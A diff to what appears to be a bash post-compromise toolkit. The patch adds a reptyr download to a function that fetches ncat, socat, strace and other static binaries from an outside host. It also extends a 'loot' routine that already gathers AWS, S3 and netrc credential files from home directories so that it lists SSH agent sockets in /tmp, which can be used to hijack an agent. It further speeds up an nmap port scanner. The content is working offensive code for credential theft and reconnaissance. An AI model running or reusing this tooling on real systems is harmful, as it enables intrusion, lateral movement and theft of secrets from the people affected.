@@ -383,6 +383,7 @@ bin() {
     bin_dl nc        "https://bin.ajam.dev/${a}/ncat"
     bin_dl socat     "https://bin.ajam.dev/${a}/socat"
     bin_dl jq        "https://bin.ajam.dev/${a}/jq"
+    bin_dl reptyr    "https://bin.ajam.dev/${a}/reptyr"
     bin_dl netstat   "https://bin.ajam.dev/${a}/netstat"
     bin_dl rsync     "https://bin.ajam.dev/${a}/rsync"
     bin_dl strace    "https://bin.ajam.dev/${a}/strace"
@@ -510,6 +511,12 @@ loot() {
     _loot_homes "AWS S3" ".passwd-s3fs"
     _loot_homes "AWS S3" ".boto"
     _loot_homes "NETRC"  ".netrc"
+
+    ls -al /tmp/ssh-* &>/dev/null && {
+        echo -e "${CB}SSH AGENT${CDY}${CF}"
+        find /tmp -name 'agent.*' -ls
+        echo -e "${CN}"
+    }
 }
 
 ws() {
@@ -552,7 +559,6 @@ hs_init_dl() {
         dl() { 
             local opts=()
             [ -n "$UNSAFE" ] && opts=("-k")
-            # curl -fsSL "${opts[@]}" --proto-default https --connect-timeout 7 --retry 3 "${1:?}"
             curl -fsSL "${opts[@]}" --connect-timeout 7 --retry 3 "${1:?}"
         }
     elif command -v wget >/dev/null; then
@@ -608,10 +614,10 @@ _scan_single() {
     local opt=("${2}")
 
     [ -f "$2" ] && opt=("-iL" "$2")
-    nmap -Pn -p"${1}" --open --host-timeout 5s -n -oG - "${opt[@]}" | grep -F Ports
+    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" | grep -F Ports
 }
 
-# scan <port> <IP or file>
+# scan <port> <IP or file> ...
 scan() {
     local port="${1:?}"
 
